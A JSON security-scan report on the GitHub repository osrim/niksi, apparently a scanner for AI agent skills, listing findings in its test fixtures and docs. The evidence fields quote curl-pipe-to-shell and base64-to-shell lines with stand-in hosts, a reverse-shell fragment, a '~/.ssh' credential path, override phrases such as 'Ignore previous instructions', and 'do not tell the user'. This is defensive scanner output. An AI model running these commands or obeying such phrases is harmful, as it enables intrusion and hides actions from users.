@@ -1,0 +1,570 @@
+{
+  "item": {
+    "source": "github:claude-skills",
+    "ecosystem": "GitHub",
+    "name": "osrim/niksi",
+    "version": "979157344216ca984988a88072d757b35b491a20",
+    "download": "https://codeload.github.com/osrim/niksi/tar.gz/979157344216ca984988a88072d757b35b491a20"
+  },
+  "archive_sha256": "6cb02aa4b8c24ffbe18f1a476ae448be43baa67c05bbf1b717a44118bcd4314b",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/anthropic-skills/discernment-nudge/SKILL.md",
+      "line": 167,
+      "evidence": "p=0.94 The nudge is two or three follow-up questions the user could send back to you, e",
+      "file_sha256": "9191177c4a8ef11a20dace786d708506b22d43e748c71287bb823de0dc812dad"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/anthropic-skills/theme-factory/SKILL.md",
+      "line": 19,
+      "evidence": "p=0.97 ## Usage Instructions",
+      "file_sha256": "c35893e221e28895c52143cc11bf30e41a44817796b39d4b15727dadc9796552"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/anthropic-skills/skill-creator/SKILL.md",
+      "line": 117,
+      "evidence": "p=0.94 Prefer using the imperative form in instructions.",
+      "file_sha256": "dcd4803e61e913e6fc27294184cd3a71f09f5e924ff20c8a9a20173e7b3c2bcf"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/anthropic-skills/skill-creator/SKILL.md",
+      "line": 302,
+      "evidence": "p=0.96 3. **Explain the why.** Try hard to explain the **why** behind everything you're",
+      "file_sha256": "dcd4803e61e913e6fc27294184cd3a71f09f5e924ff20c8a9a20173e7b3c2bcf"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/anthropic-skills/skill-creator/agents/analyzer.md",
+      "line": 57,
+      "evidence": "p=1.00 Score instruction following 1-10 and note specific issues.",
+      "file_sha256": "bf68f4cac5a56c673a928c2e6d619586c5b93ea364026ab37547772cb45a663a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/superpowers/executing-plans/SKILL.md",
+      "line": 39,
+      "evidence": "p=0.94 Four things stop you, and only these: an irreversible or destructive operation; ",
+      "file_sha256": "f38e8f2ddcf079f65493adc713c1fed78421dfaf5f4dbf6b3a6b2b1d95466e71"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/superpowers/diagnosing-superpowers/prompts/request-conflicts.md",
+      "line": 6,
+      "evidence": "p=0.99 1. List every human prompt with line and turn. For each, extract the instruction",
+      "file_sha256": "e800e38d8b7752c212c76c5c3ed75cd78b749684263ea0c313586f26af6f4b5c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/superpowers/subagent-driven-development/SKILL.md",
+      "line": 27,
+      "evidence": "p=0.94 Four things stop you, and only these: an irreversible or destructive operation; ",
+      "file_sha256": "8dde5589ee083fb4999106d116f01c8fdaf3116a8a9813fdedeb80329de49046"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/superpowers/brainstorming/scripts/server.cjs",
+      "line": 540,
+      "evidence": "cp.exec(process.env.BRAINSTORM_OPEN_CMD + ' ' + JSON.stringify(url), () => {})",
+      "file_sha256": "2d2961ea8d11f56c5f4c3a1a68d22709efa5d7601a2246d8c880774e7e9e8412"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/testdata/benign-skills/superpowers/using-superpowers/SKILL.md",
+      "line": 63,
+      "evidence": "p=0.98 ## User Instructions",
+      "file_sha256": "82c5c8866ad7f5dd4440ce66bd7806ba48a2f13771beae5cf112e53f08fe36ba"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/ui/report.test.ts",
+      "line": 84,
+      "evidence": "curl, line: 2, detail: \"curl https://x.invalid | sh",
+      "file_sha256": "c5fb143d8bd345170c9a4000db6a7b69a1b0dd129e4a004c81079090181ca9b5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/ui/report.test.ts",
+      "line": 59,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c5fb143d8bd345170c9a4000db6a7b69a1b0dd129e4a004c81079090181ca9b5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/commands/adopt.integration.test.ts",
+      "line": 341,
+      "evidence": "curl https://x.invalid/i.sh | bash",
+      "file_sha256": "c878ccf1ab6be7417f62295411c600e022bb64d059f1059b545276d17aeedaf9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/commands/update.integration.test.ts",
+      "line": 610,
+      "evidence": "curl = \"curl https://x.invalid/i.sh | sh",
+      "file_sha256": "3755ea188bec0193f46c06d526e7597831d14a594fa2732fafc88fb6b4c03c3e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/commands/github-action.integration.test.ts",
+      "line": 286,
+      "evidence": "curl https://x.invalid/i.sh | bash",
+      "file_sha256": "7fe455e6aa4006e7e614e4d586fd13d57e76ab4a2348cfbae021199afbfff4fd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/commands/github-action.integration.test.ts",
+      "line": 327,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "7fe455e6aa4006e7e614e4d586fd13d57e76ab4a2348cfbae021199afbfff4fd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/commands/audit.integration.test.ts",
+      "line": 87,
+      "evidence": "curl https://x.invalid/i.sh | sh",
+      "file_sha256": "0a1af0df236477d9440d2428271a5b4e97d6a1514971f1e0c180665c51aed198"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/commands/audit.integration.test.ts",
+      "line": 67,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "0a1af0df236477d9440d2428271a5b4e97d6a1514971f1e0c180665c51aed198"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/skill/markdown.test.ts",
+      "line": 78,
+      "evidence": "curl x.invalid | sh",
+      "file_sha256": "e07b7fd356a582ca353c7b5f4078b847956935bc3e7b8250d2210fdf27bdb818"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/skill/files.test.ts",
+      "line": 45,
+      "evidence": "curl evil | sh",
+      "file_sha256": "772094cb1b2d2b2dc1d9ae3794ac732e0ccac30808bfc2861e54055e5a7d4cb8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/install/apply.test.ts",
+      "line": 127,
+      "evidence": "curl evil | sh",
+      "file_sha256": "345d3c89b6efcad566e6cf31d663e769c46bcdd2d1bdc6c2fd2ab39c5f379f4d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/prompt-injection.test.ts",
+      "line": 16,
+      "evidence": "Ignore prior instructions",
+      "file_sha256": "8d3bdf80cc36c9a1e82bbb528b9973d2dc00d430d448a89d49390f5c00633fea"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/archive.test.ts",
+      "line": 17,
+      "evidence": "curl x | sh",
+      "file_sha256": "a3729160b60a3f8cd23ced270aacde51d671b3c025aed05c62e1532dcfda9ec8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/whitespace-padding.test.ts",
+      "line": 27,
+      "evidence": "curl https://x.invalid/i.sh | sh",
+      "file_sha256": "8f7d3db12b65aca59851f054fc56d49f76e13677703f5680b1e317f387e394f9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/index.test.ts",
+      "line": 39,
+      "evidence": "curl https://x.invalid/i.sh | sh",
+      "file_sha256": "ac13ae79ac3f0a238991b502fce31384095c424281f72268f41b5999a07047ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/hidden-html.ts",
+      "line": 15,
+      "evidence": "wget|bash",
+      "file_sha256": "57217731b9f64a23ee254e97ea4a842f92474d47b950b07ae4aa004cb1f40f58"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/persistence.ts",
+      "line": 79,
+      "evidence": "curl -s https://x.invalid/a | sh",
+      "file_sha256": "6682a3a84b7ea09fb840f9b126af1001d0e025515257d04696e93579367e33ef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/reverse-shell.ts",
+      "line": 7,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "ecb8ee403562ca92d5864c870bb92e65fd446c56fc7fa927f614a255c009d3e9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/confusable-host.ts",
+      "line": 20,
+      "evidence": "curl https://\\u0430pple.com/x | sh",
+      "file_sha256": "ed9af7abe88ade97e8c49a640236fac6db3787552c5c99b39b8df7fb3e048b58"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/hidden-html.ts",
+      "line": 5,
+      "evidence": "curl | sh",
+      "file_sha256": "bdd7245bf7b43c5b62b17aa486ed5954b0533e247e138b49b1af1efa818cc7d0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/hidden-html.ts",
+      "line": 28,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "bdd7245bf7b43c5b62b17aa486ed5954b0533e247e138b49b1af1efa818cc7d0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/install-hook.ts",
+      "line": 22,
+      "evidence": "curl -s https://x.invalid/p|sh",
+      "file_sha256": "a6cbd95ae453b075140022a871b55ea5298d5a7f212da007e46f31ea086667f0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/whitespace-padding.ts",
+      "line": 9,
+      "evidence": "curl https://x.invalid/i.sh | sh",
+      "file_sha256": "c87f55ee7460568ca2f772641f9d8e52bc5152d29cc8118677b7ffcd739c50a3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/invisible-unicode.ts",
+      "line": 46,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "15227ac38206c383077943fe83305d3996d901c2e086ba49921b0761e205ea4d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/prompt-injection.ts",
+      "line": 7,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "96ce1ec0527e756eabeddcd426ac10108a40fb215f7325acf4c4dc6fff0db061"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/curl-pipe-shell.ts",
+      "line": 11,
+      "evidence": "curl https://x.invalid/i.sh | bash",
+      "file_sha256": "9ba1ad6695fc5addd1e3248ccb379f205d381299969ed16fe3bbf8cc57c9a25e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/fixtures/base64-exec.ts",
+      "line": 9,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "6b26f5dda8ab48d3b0a4dd2e738b40d31bd88f5198c971c399b0e1b7937652f5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/install-hook.test.ts",
+      "line": 110,
+      "evidence": "curl https://x.invalid | sh",
+      "file_sha256": "4b1240cd8b535fff0be4984ae434b8fe5c137d0aa9848d401c52c878b35e2ae1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/base64-exec.test.ts",
+      "line": 56,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "27a0e1b0ff8990e3d4c4275ab80afca0dabf86113378cf31d93bc4c390cec2a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/reverse-shell.test.ts",
+      "line": 15,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "547ffed173c44e6ca9536dcc4c88baaad1a936cc9562469fdaab306d465edba7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/confusable-host.test.ts",
+      "line": 11,
+      "evidence": "curl -sSL https://raw.githubusercontent.com/\\u0430cme/tool/install.sh | sh",
+      "file_sha256": "be0e02dd670116d13b246c07ce5cccef1c42834977763cad085fee1899113268"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/redact.test.ts",
+      "line": 31,
+      "evidence": "curl https://host.dev | sh",
+      "file_sha256": "574d6cb487b3de3a639be182f2f77114f6ad904495a28c17f49d8663b26f10fe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/rules.test.ts",
+      "line": 282,
+      "evidence": "~/.ssh",
+      "file_sha256": "149b022ffce2da00e6ab128e9d5e68bc60e6efbb54917476d54ffc85c4300692"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/rules.test.ts",
+      "line": 260,
+      "evidence": "curl-pipe-shell\", \"critical\", \"runs downloaded code\", \"curl https://x.sh | bash",
+      "file_sha256": "149b022ffce2da00e6ab128e9d5e68bc60e6efbb54917476d54ffc85c4300692"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/rules.test.ts",
+      "line": 261,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "149b022ffce2da00e6ab128e9d5e68bc60e6efbb54917476d54ffc85c4300692"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/rules.test.ts",
+      "line": 289,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "149b022ffce2da00e6ab128e9d5e68bc60e6efbb54917476d54ffc85c4300692"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/cli/src/core/scan/shell.test.ts",
+      "line": 17,
+      "evidence": "curl x.invalid | sh",
+      "file_sha256": "ebde25641f28ca0f2ec27df3e495f58213c1a1ee25478adf745b55b4b388c13a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/docs/commands.md",
+      "line": 446,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "13ad2826aa9f892a6a0adcd7dea2391e1795a48c616a1b1d1e6b68ffd24eeeec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/docs/security-scan.md",
+      "line": 202,
+      "evidence": "curl … | sh",
+      "file_sha256": "dc45884fe491de610f541b4a62e3dd151cf777935f789b73693914cf58c62b38"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/docs/security-scan.md",
+      "line": 176,
+      "evidence": "pty.spawn(\"/bin/",
+      "file_sha256": "dc45884fe491de610f541b4a62e3dd151cf777935f789b73693914cf58c62b38"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/docs/security-scan.md",
+      "line": 191,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "dc45884fe491de610f541b4a62e3dd151cf777935f789b73693914cf58c62b38"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "niksi-979157344216ca984988a88072d757b35b491a20/docs/security-scan.md",
+      "line": 202,
+      "evidence": "do not tell the user",
+      "file_sha256": "dc45884fe491de610f541b4a62e3dd151cf777935f789b73693914cf58c62b38"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "10.0.0.8",
+    "127.0.0.1",
+    "172.16.4.1",
+    "172.32.0.1",
+    "192.168.1.2",
+    "45.1.2.3",
+    "a.example.com",
+    "abc.ngrok-free.app",
+    "academy.claude.com",
+    "acme-docs.invalid",
+    "acme.com",
+    "acme.dev",
+    "agentskills.io",
+    "api.dev",
+    "api.example.com",
+    "api.github.com",
+    "api.openai.com",
+    "api.telegram.org",
+    "api.test",
+    "attacker.invalid",
+    "b.com",
+    "b.example.com",
+    "bitbucket.org",
+    "bun.sh",
+    "cdn.sheetjs.com",
+    "cdnjs.cloudflare.com",
+    "code.claude.com",
+    "codeberg.org",
+    "collector.dev",
+    "d.com",
+    "developer.mozilla.org",
+    "discord.com",
+    "docs.acme.dev",
+    "docs.dev",
+    "docs.example.org",
+    "docs.niksi.dev",
+    "docs.renovatebot.com",
+    "eo1.m.pipedream.net",
+    "evil.dev",
+    "evil.invalid",
+    "example.com",
+    "example.com.evil.dev",
+    "example.dev",
+    "example.invalid",
+    "files.pythonhosted.org",
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "git.example.com",
+    "github.com",
+    "github.com.evil.example",
+    "gitlab.com",
+    "h.dev",
+    "h.invalid",
+    "hooks.slack.com",
+    "host.dev",
+    "img.shields.io",
+    "mcp.linear.app",
+    "mintcdn.com",
+    "mirror.niksi.dev",
+    "modelcontextprotocol.io",
+    "mywebhook.site",
+    "niksi-test.invalid",
+    "nope.invalid",
+    "npm.x.invalid",
+    "openssh.com",
+    "other.dev",
+    "pkgs.x.invalid",
+    "platform.claude.com",
+    "primeradiant.com",
+    "pypi.org",
+    "pypi.org.x.invalid",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    "ru.wikipedia.org",
+    "ui.shadcn.com",
+    "webhook.site",
+    "webhook.site.example.dev",
+    "www.apache.org",
+    "www.github.com",
+    "www.npmjs.com",
+    "x.invalid",
+    "x.sh",
+    "xn--bcher-kva.example",
+    "xn--pple-43d.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
